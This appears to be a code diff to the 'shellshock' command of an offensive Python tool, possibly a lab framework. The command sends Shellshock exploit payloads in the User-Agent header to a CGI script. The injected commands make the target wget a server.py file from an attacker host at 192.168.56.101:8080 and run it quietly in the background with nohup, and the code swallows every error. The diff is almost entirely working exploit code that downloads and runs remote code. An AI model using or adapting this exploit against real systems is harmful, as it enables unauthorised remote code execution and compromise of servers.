@@ -1,21 +1,35 @@
 from ..commands import Command
 import requests
 
+ATTACK_HOST = "192.168.56.101"
+ATTACK_PORT = 8080
+VENV_PYTHON = "/var/tmp/.venv/bin/python3"
+SERVER_PATH = "/var/tmp/server.py"
+
+
 def send_shellshock_payload(target: str) -> None:
-    """Send the Shellshock exploit payload to the target"""
     url = f"http://{target}/cgi-bin/shockme.cgi"
-    command = "wget http://e1-attack.local:8080/server.py -O /tmp/server.py && python3 /tmp/server.py &"
-    payload = f"() {{ :; }}; {command}"
+
+    wget_command = f"/usr/bin/wget -q http://{ATTACK_HOST}:{ATTACK_PORT}/server.py -O {SERVER_PATH}"
+    python_command = f"/usr/bin/nohup {VENV_PYTHON} {SERVER_PATH} 0</dev/null 1>/dev/null 2>/dev/null &"
+
+    session = requests.Session()
+    session.headers.clear()
 
     try:
-        response = requests.get(url, headers={"User-Agent": payload})
-        print(f"[+] Payload sent. Status: {response.status_code}")
-    except requests.exceptions.ConnectionError:
-        print(f"[!] Could not connect to {target}")
-    except requests.exceptions.Timeout:
-        print(f"[!] Request timed out")
-    except Exception as e:
-        print(f"[!] Unexpected error: {e}")
+        session.get(url, headers={"User-Agent": f"() {{ :; }}; {wget_command}"}, timeout=5)
+        print("[+] Wget payload sent.")
+    except Exception:
+        pass
+
+    try:
+        session.get(url, headers={"User-Agent": f"() {{ :; }}; {python_command}"}, timeout=5)
+        print("[+] Launch payload sent.")
+    except Exception:
+        pass
+
+    print("[+] Shellshock complete.")
+
 
 class shellshock(Command):
     """
@@ -23,9 +37,11 @@ class shellshock(Command):
     Usage: shellshock <target>
     """
     def do_command(self, lines: str):
-        line = lines.split(" ")
-        target = line[0]
-        send_shellshock_payload(target)
+        parts = lines.split()
+        if not parts:
+            print("Usage: shellshock <target>")
+            return
+        send_shellshock_payload(parts[0])
 
 
 command = shellshock
